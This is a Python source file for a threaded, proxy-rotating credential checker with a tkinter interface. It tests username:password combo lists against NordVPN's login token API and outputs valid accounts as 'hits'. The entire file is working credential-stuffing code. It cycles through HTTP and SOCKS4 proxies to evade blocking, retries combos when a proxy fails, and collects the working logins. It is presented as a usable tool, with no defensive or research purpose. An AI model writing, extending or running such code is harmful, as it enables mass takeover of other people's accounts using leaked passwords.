from random import randint
import tkinter as tk
import threading
import requests
import traceback

class Authenticate:
    def __init__(self, account:list, proxy:dict, timeout, working, failed, output, proxies_count, remaining, proxyless):
        self.account = account
        self.proxy_dict = proxy
        self.timeout = timeout/1000
        self.working = working
        self.failed = failed
        self.output = output
        self.proxies_count = proxies_count
        self.remaining = remaining
        self.proxyless = proxyless
    
    def authenticate(self, combos:list, proxies:list):
        proxy_scheme = None
        if self.proxyless == 0:
            if self.proxy_dict['type'] ==  'https':
                proxy_scheme = {
                    'http': f'http://{self.proxy_dict["proxy"]}',
                    'https': f'http://{self.proxy_dict["proxy"]}'
                }
            elif self.proxy_dict['type'] == 'socks4':
                proxy_scheme = {
                    'http':f'socks4://{self.proxy_dict["proxy"]}',
                    'https':f'socks4://{self.proxy_dict["proxy"]}'
                }

        body={
            'username':self.account[0],
            'password':self.account[1]
        }
        try: 
            if self.proxyless == 0:
                res = requests.post('https://api.nordvpn.com/v1/users/tokens', data=body, proxies=proxy_scheme, timeout=self.timeout)
            else:
                res = requests.post('https://api.nordvpn.com/v1/users/tokens', data=body, timeout=self.timeout)
            try:
                res.json()['token']
            except:
                try:
                    if res.json()['errors']['message'] == 'Invalid username' or res.json()['errors']['message'] == 'Invalid password':
                        self.failed.update_failed()
                        self.remaining.update_remaining()
                except:
                    if self.proxyless == 0:
                        try:
                            combos.append(self.account)
                            for p in range(len(proxies)):
                                if proxies[p]['proxy'] == self.proxy_dict['proxy']:
                                    del proxies[p]
                                    self.proxies_count.update_proxies()
                                    break
                        except:
                            self.failed.update_failed()
                            self.remaining.update_remaining()
                    else:
                        self.failed.update_failed()
                        self.remaining.update_remaining()
            else:
                self.output.text.insert('end', f'{self.account[0]}:{self.account[1]}\n')
                self.remaining.update_remaining()
                self.working.update_hits()

        except:
            if self.proxyless == 0: 
                try:
                    for p in range(len(proxies)):
                        if proxies[p]['proxy'] == self.proxy_dict['proxy']:
                            del proxies[p]
                            self.proxies_count.update_proxies()
                            break
                except:
                    self.failed.update_failed()
                    self.remaining.update_remaining()
            else:
                self.failed.update_failed()
                self.remaining.update_remaining()

class Checker(Authenticate):
    def __init__(self, combos, proxies, output, threads, timeout, status, failed, working, popup, proxies_count, remaining, proxyless):
        self.combos = combos
        self.proxies = proxies
        self.output = output
        self.threads = threads
        self.timeout = timeout
        self.status = status
        self.working = working
        self.failed = failed
        self.popup = popup
        self.proxies_count = proxies_count
        self.remaining = remaining
        self.proxyless = proxyless
    def iteration(self):
        if self.proxyless == 0:
            self.proxies_count.active_proxies = len(self.proxies)
            self.proxies_count.failed_proxies = 0
            self.proxies_count.active_text_var = tk.StringVar(value=f'Active Proxies: {self.proxies_count.active_proxies}')
            self.proxies_count.active_text.config(textvariable=self.proxies_count.active_text_var)
        else:
            self.proxies_count.active_proxies = len(self.proxies)
            self.proxies_count.failed_proxies = 0
            self.proxies_count.active_text_var = tk.StringVar(value=f'Active Proxies: {self.proxies_count.active_proxies}')
            self.proxies_count.active_text.config(textvariable=self.proxies_count.active_text_var)

        self.remaining.start(len(self.combos))
        c = 0
        while c < len(self.combos):
            if len(self.proxies) <= 0 and self.proxyless == 0:
                self.popup((500, 50), 'Ran Out Of Proxies!')
                break
            if self.status.status_var.get() == 'In Progress':
                if threading.active_count() < self.threads.slider.get():
                    try:
                        if self.proxyless == 0:
                            threading.Thread(target=self.check_account, args=(self.combos[c].split(':'), self.proxies[randint(0, len(self.proxies) - 1)])).start()
                            c+=1
                        else:
                            threading.Thread(target=self.check_account, args=(self.combos[c].split(':'), {'type':None, 'proxy':None})).start()
                            c+=1
                    except ValueError:
                        self.popup((500, 50), 'Ran Out Of Proxies!')
                        break
                    except Exception as e:
                        print(str(e))
                        break
            else:
                self.popup((500, 50), 'Ran Out Of Proxies!')
                break

    def check_account(self, combo, proxy):
        authenticate = super()
        authenticate.__init__(combo, proxy, self.timeout, self.working, self.failed, self.output, self.proxies_count, self.remaining, self.proxyless)
        authenticate.authenticate(self.combos, self.proxies)